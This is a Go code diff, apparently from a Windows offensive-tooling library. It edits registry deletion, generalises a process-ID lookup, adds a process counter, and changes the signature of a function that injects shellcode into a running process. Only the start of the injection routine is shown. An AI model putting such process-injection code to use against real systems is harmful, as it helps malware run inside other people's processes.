@@ -161,8 +161,10 @@ func DelRegKeyValue(registryString string, path string, valueName string) error 
 	if err != nil {
 		return err
 	}
-	regKey.DeleteValue(path)
-	return registry.DeleteKey(regKey, path)
+    openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
+	openRegKey.DeleteValue(valueName)
+    openRegKey.Close()
+    return nil
 }
 
 // QueryRegKey Retrives a registry key's value.
@@ -227,15 +229,39 @@ func FindPid(procName string) (int, error) {
 		return 0, err
 	}
 	for _, proc := range procs {
-		if proc.Executable() == "explorer.exe" {
+		if proc.Executable() == procName {
 			return proc.Pid(), nil
 		}
 	}
-	return 0, errors.New("explorer.exe PID not found!")
+	return 0, errors.New(procName + " PID not found!")
 }
 
+
+//GetRunningCount returns the number of copies of a process running as an int.
+func GetRunningCount(procName string) (int, error) {
+    procs, err := ps.Processes()
+    if err != nil {
+        return 0, err
+    }
+    var procCount = 0
+    for _, proc := range procs {
+        if proc.Executable() == procName {
+            procCount += 1
+        }
+    }
+    if procCount == 0 {
+        return 0, errors.New(procName + " is not running!")
+    } else {
+        return procCount, nil
+    }
+}
+
+
 //InjectShellcode Injects shellcode into a running process.
-func InjectShellcode(pid float64, payload []byte) error {
+func InjectShellcode(pid_int int, payload []byte) error {
+
+    pid := float64(pid_int);
+
 	// custom functions
 	checkErr := func(err error) bool {
 		if err.Error() != "The operation completed successfully." {
